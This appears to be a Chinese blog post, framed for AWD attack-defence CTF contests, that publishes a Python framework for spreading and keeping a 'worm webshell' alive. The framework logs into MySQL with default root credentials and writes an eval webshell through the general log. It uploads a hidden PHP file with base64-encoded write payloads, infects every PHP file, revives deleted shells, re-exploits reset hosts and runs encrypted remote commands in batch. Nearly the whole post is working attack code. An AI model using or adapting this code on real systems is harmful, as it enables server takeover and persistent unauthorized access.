@@ -1,0 +1,225 @@
+原创：3s_NWGeek合天智汇
+
+原创投稿活动：[重金悬赏 |
+合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)
+
+## 0x00 python维持复活框架  
+
+一个蠕虫webshell只是相当于一枚好的**，我们还需要配置一把*来搭配使用，那么如何做到我们落地98k，别人落地还要慢慢捡*才能吃鸡呢。
+上篇只是的简单执行命令的客户端，但下面这个是基于这个蠕虫webshell的python维持复活框架，大致思路是这样的。
+
+## 0x01 webshell特性  
+
+首先回顾一下最终版蠕虫webshell的特性如下：
+
+  1. 递归扫描所有web目录及文件，全部扫到的php写入webshell  
+
+  2. 网站全部php可作为webshell连接执行命令  
+
+  3. 不带参数请求又可以正常访问原页面，不影响访问  
+
+  4. 所有web路径目录写入单独一个特定webshell  
+
+  5. 判断是否写过不再重复写入  
+
+  6. 所有php页面都可以互相复活蠕虫webshell  
+
+  7. 蠕虫webshell返回所有php文件url地址  
+
+  8. 蠕虫webshell发送返回数据传输加密  
+
+  9. 数字签名校验执行、5秒后不可重放  
+
+  10. 页面功能性可控（可以使全部php原有功能失效，只剩下webshell功能）  
+
+  11. 前端互相复活以及反渗透  
+
+  12. 适配meterpreter连接   
+
+  13. 加密混淆   
+
+具体的蠕虫webshell代码详情可以参考上一篇文章：[基于AWD比赛的蠕虫webshell(一)](https://mp.weixin.qq.com/s/8jrb_q8oysSfC2CC6m13bw)
+
+## 0x02 流程  
+
+根据以上蠕虫webshell特性我们可以设计一个框架出来使蠕虫从生成到维持最后互相复活，如果都被删了或者对手重置环境，就自动快速重新getshell再次复活。
+
+![v2-f43dfdb9db55096f35a8eff8e7510e43_hd.p](https://pic3.zhimg.com/80/v2-f43dfdb9db55096f35a8eff8e7510e43_hd.png)
+
+简单来说就是，python有技巧地批量请求所有靶机ip。只需编写getshell的模块，模块返回一个蠕虫webshell的url，就会自动本地传播感染所有php文件，即使比赛对手重置环境会重新getshell再次感染，删掉其中一个马会使用其他被感染的马复活。
+如果在代码最后面加个exit();全部php页面将会失效只剩下webshell功能。（适用于登山夺旗模式比赛）因为比赛环境实在太多突发状况，我认为已经考虑到比较多出现的情况就是超时，webshell失效，漏洞修补完成，上马后别人删所有文件等等，但不排除还会有其他错误使这个py跑崩的情况，目前没发现。
+
+## 0x03 代码解析  
+
+框架中假设这个情况是数据库的root/root密码getshell。并且在自己awd服务器查到web绝对路径是/var/www/html(比赛时靶机大家都一样，可以查看自己的绝对路径)，我们的getshell方式是数据库日志写shell，然后通过shell上传蠕虫webshell，再维持权限和复活。
+
+于是有了以下的代码，要结合上面的思路图来看。
+
+#!/usr/bin/python # -*- coding: UTF-8 -*- # made by 3s_NwGeek import
+requests,random,MySQLdb,re,base64 import time from gevent import monkey from
+gevent.pool import Pool from bs4 import BeautifulSoup from urllib import
+unquote monkey.patch_all() passwd = 'admin'#这是蠕虫webshell的密码
+username="root"#数据库名一定要root权限才可以有效写文件 login_psw="root" webshell_path=
+'http://TARGET_IP/service.php'#要跟查询路径的文件名相同！！！！！！！！！ webshell_psw='a111'
+localfile = 'C:\Users\\\3s_NwGeek\Desktop\\\light.php' # 本地待上传的马文件名
+#Secure_file_priv <5.5.53可以直接loadfile读flag，然后命令行curl提交 # #路径要改,log_file =
+'C:/phpstudy/WWW/test1.php'一定要跟上面webshell_path保持统一文件名
+webroot='D:/installed_software/phpstudy/WWW' cmd='del %s/service.php'%webroot
+#数据库要执行的命令 sqlquerys=('''select @@version; set global general_log = off; set
+global general_log = on; set global general_log_file = '%s/service.php';
+select "<?php phpinfo();eval($_POST['a111']);exit();?>"; set global
+general_log = off; '''%webroot).splitlines()
+#TARGET_IP不用改，会在函数中替换，填多几个php作为备用访问
+bakup_webshell_url='''http://TARGET_IP/index.php
+http://TARGET_IP/light.php'''.splitlines() #批量目标主机，格式127.0.0.1:80
+targets=open("C:\Users\\\3s_NwGeek\Desktop\\\target.txt").read().splitlines()#批量目标
+##只需填上面的部分即可 localfile_content = open(localfile, 'rb').read() def
+main(target): while True: usual_get(target) webshell_url=upupup(target) #读取url
+php -loadip 、reupload、get ?_、norespond、random get # print
+webshell_url,'testing!!!!' if not webshell_url: print 'if not webshell_url and
+continute' continue elif 'http' not in webshell_url: time.sleep(3) # print
+"主循环一次" print 'elif http not in webshell_url:' continue
+tar,res=maintain_webshell(webshell_url,target) if len(res)>0:
+random_get(target,res) else: # print len(res),res pass time.sleep(5) # print
+"主循环一次" #getshell函数，框架要求return蠕虫webshell的url即可 def upupup(target): try: conn =
+MySQLdb.connect(host=target, user=username,
+passwd=login_psw,port=3306,connect_timeout=1) print target,':login scceuss'
+time.sleep(0.5) cursor = conn.cursor() # 使用execute方法执行SQL语句 #
+cursor.execute('set password for root@localhost = password("%s");
+'%change_pwd) for sql_q in sqlquerys: cursor.execute(sql_q) time.sleep(0.5)
+data = cursor.fetchone() if data: print "%s return : %s " % (target, data) #
+使用 fetchone() 方法获取一条数据 # 关闭数据库连接 conn.close() reg = ".*/([^/]*\\.php?)" w_path
+= webshell_path.replace('TARGET_IP', target) print w_path match_shell_name =
+re.search(reg, w_path) if match_shell_name: shell_name =
+match_shell_name.group(1) # 1.php shell_path = "" try: data = {}
+data[webshell_psw] = '@eval(base64_decode($_POST[z0]));' data['z0'] =
+'ZWNobyAnIS1fLSEtXy0hJy4kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLichLV8tIS1fLSEnOw=='
+shell_path = re.findall(re.compile(r'\\!-_-\\!-_-\\!.+\\!-_-\\!-_-\\!'),
+requests.post(w_path, data).text.strip())[0].replace('!-_-!-_-!', '')#获取绝对路径 #
+print shell_path target_path =
+shell_path.split(shell_name)[0].replace('TARGET_IP', target) +
+'/.Conf_check.php' # 获取上传绝对路径文件地址 # print 'target_path:',target_path
+target_path_base64 = base64.b64encode(target_path) # print
+w_path,w_path.split(shell_name) target_file_url =
+w_path.split(shell_name)[0].replace('TARGET_IP', target) + '/.Conf_check.php'
+# 上传url地址 # print 'target_file_url:',target_file_url data = {}
+data[webshell_psw] = '@eval(base64_decode($_POST[z0]));' data[ 'z0'] =
+'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRidWY9IiI7CmZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTEpCiAgICAkYnVmLj1zdWJzdHIoJGMsJGksMSk7CmVjaG8oQGZ3cml0ZShmb3BlbigkZiwidyIpLCRidWYpKTsKZWNobygifDwtIik7CmRpZSgpOw=='
+data['z1'] = target_path_base64 data['z2'] =
+base64.b64encode(localfile_content) # print 'webshell_path:',w_path,data
+requests.post(w_path , data).text.strip() if 'check_url' in
+requests.get(target_file_url + "?_").content: print target,':getshell
+success!!!!!!!!!!!!!!',excmd(target_file_url, passwd, cmd, encoding='utf-8')
+return target_file_url.replace('TARGET_IP', target) except Exception as e: if
+'list out of range' in str(e): print target,'日志获取根路径错误：target_path' print e
+pass except Exception as e: print target+' is no vul:','有可能输入格式错误',e def
+maintain_webshell(webshell_url, target, Timeout=5):#检测函数，返回检测目标，检测结果 # print
+"进入maintain_webshell()" head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0;
+Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0', 'Accept':
+'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Cache-Control':
+'max-age=0'} try: r=requests.get(webshell_url + '?_',
+headers=head,timeout=5,proxies={'http': 'http://127.0.0.1:8080'}) # print
+r.content #
+html=BeautifulSoup(r.content.decode('gb2312','ignore'),'lxml')#注意根据实际情况编码 html
+= BeautifulSoup(r.content, 'lxml', from_encoding="utf8") # 注意根据实际情况编码
+checks_arr = html.find_all(attrs={'id': 'check_url'})#获取url if
+len(checks_arr)<2:#爬取失败重传马 print target,"%s 获取phpurl：%d 状态码 %d
+webshell失效，正在尝试重传webshell\n" % (webshell_url,len(checks_arr),r.status_code)
+time.sleep(0.5) webshell_url, check_res=maintain_webshell(upupup(target),
+target)# # usual_get(target) else: check_res = [] for check_str in checks_arr:
+check_res.append(check_str.string) print
+"权限维持成功:",target,len(check_res),webshell_url # print
+"跳出maintain_webshell():find_allphp" return webshell_url, check_res except
+Exception as e: if 'timeout' in str(e): RCE_res=excmd(webshell_url, passwd,
+'echo testRCE') if RCE_res: print
+target,'：执行命令成功，但感染超时，请使用轻便版--------->',RCE_res return
+webshell_url,bakup_webshell_url else: print
+target+'：执行命令失败，可能权限不足感染失败，或者php遍历函数被禁，or 主机连接失败' print target,'err from
+maintain_webshell',e # print "跳出maintain_webshell():err" return
+webshell_url,[] def random_get(target,res): try: # print "进入random_get"
+buff=res while len(res)>1: ran_url=random.sample(buff,1)[0] ran_url, res =
+maintain_webshell(ran_url, target) if len(res)<2:#失效情况下 random.shuffle(buff)
+for url in buff: url, res = maintain_webshell(url, target) if len(res)>2:
+buff=res break print target,'该webshell失效，正在尝试缓存buff' elif len(res)>=2:#成功情况下
+buff=list(set(buff+res)) # print buff print len(buff) time.sleep(3) else:
+print "random_get——res：",res,"buff:",buff usual_get(target) # print
+"跳出random_get()"# print '权限维持成功：', len(res),r, res except Exception as e:
+print '%s "err from random_get"：上传webshell_url错误！:%s'%(target,e) pass def
+usual_get(target): try: # print "进入usual_get()"
+base_url='http://'+target+'/.Conf_check.php'
+w_url,res=maintain_webshell(base_url,target) if len(res)>1: # print res
+random_get(target,res) # print "跳出usual_get()" except: pass
+################以下为命令执行函数 def getSerTime(url): ser_time_format = '%a, %d %b %Y
+%H:%M:%S GMT' head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+rv:62.0) Gecko/20100101 Firefox/62.0', 'Accept':
+'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Cache-Control':
+'max-age=0'} r = requests.get(url,
+allow_redirects=False,headers=head,proxies={'http': 'http://127.0.0.1:8080'})
+if r.headers['Date']: stimestrp = time.strptime(r.headers['Date'],
+ser_time_format) stime = time.mktime(stimestrp) + 60 * 60 * 8 # GMT + 8 时区
+timeskew = int(time.time()) - int(stime) return timeskew else: return None #
+加密 def encrypt(string, salt, encoding='utf-8'): estring = '' b64string =
+base64.b64encode(string.encode(encoding)).decode('utf-8') for n, char in
+enumerate(b64string): estring += chr(ord(char) ^ n % salt) return estring # 解密
+def decrypt(estring, salt, encoding='utf-8'):
+data=estring[::-1].replace('cAFAcABAAswTA2GE2c','i').replace(':kcehc_revres','=').encode('unicode_escape').decode("string_escape")
+string=unquote(base64.urlsafe_b64decode(data)) # string=unicode(string,
+"gb2312").encode("utf8")#有中文乱码去掉这个注释 return string # 命令执行 def excmd(url,
+passwd, cmd, encoding='utf-8'): try: timeskew =
+getSerTime('/'.join(url.split('/')[:-1])) # 校对服务器时间，防止时间差造成API校验失败 nowtime =
+int(time.time()) if timeskew == None: print('检查服务器时间出错，请手动确认服务器时间！') #
+手动获取服务器时间戳，并保存到servtime变量中，int类型 servtime = time.time() nowtime = servtime
+else: nowtime -= timeskew # 开始发起请求 passwd =
+md5(passwd.encode('utf-8')).hexdigest() salt = int(random.random() * 100) ecmd
+= encrypt(cmd, salt) sign_tmp = ecmd + passwd + str(nowtime) + str(salt) sign
+= md5(sign_tmp.encode('utf-8')).hexdigest() parameters = { 'time': nowtime,
+'check': ecmd, 'salt': salt, 'sign': sign } head = {'User-Agent': 'Mozilla/5.0
+(Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0', 'Accept':
+'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Cache-Control':
+'max-age=0'} r = requests.get(url, params=parameters,
+headers=head,proxies={'http': 'http://127.0.0.1:8080'},timeout=3) # r =
+requests.post(url, data=parameters, headers=head, proxies={'http':
+'http://127.0.0.1:8080'}), if '0:' in r.text:print '执行成功：', res =
+decrypt(r.content.decode('utf-8').replace('0:',''), salt, encoding) return res
+except Exception as e: pass print(url,'参数配置错误，连接异常err:%s'%str(e)) #
+traceback.print_exc() if __name__ == '__main__': # main(target) pool =
+Pool(len(targets))#批量 pool.map(main, targets)#一个线程一个target
+
+效果如下gif：
+
+  
+
+## 0x04 框架通用getshell函数编写  
+
+有了这个框架，除了数据库写shell当然有很多getshell的方法，于是有了对应的脚本，通通写好。
+可以把你getshell的方法写到upupup函数就ok了，最终return一个蠕虫webshell url运行即可。
+
+  1. Getshell模块可以改为任意方式getshell填充到upupup函数里  
+
+  2. 会感染所有php  
+
+  3. 路径文件出现中文可能报错提示，但不影响维持运行  
+
+  4. 删除每个目录下的单独马会复活  
+
+  5. 直到所有被感染过的所有php都无法访问会重新getshell  
+
+配合批量命令执行如以下gif：（需要图片，私聊小编）
+
+  
+
+## 0x05 缺点与不足  
+
+很多时候都是权限造成的写入失败，有命令执行的时候建议chmod 777 -R *，再curl -o 落地会增加成功几率。
+
+## 0x06 蠕虫webshell最终版  
+
+蠕虫webshell代码详情可以参考上一篇文章[《基于AWD比赛的蠕虫webshell(一)》](https://mp.weixin.qq.com/s/8jrb_q8oysSfC2CC6m13bw)，但实际我最终在awd比赛中用的是混淆版本，对方很难短时间内解密，已上传至github:<https://github.com/3sNwgeek/awd_worm_phpwebshell_framework/>,最后祝大家年末比赛顺利。
+
+声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！
+
+  
+
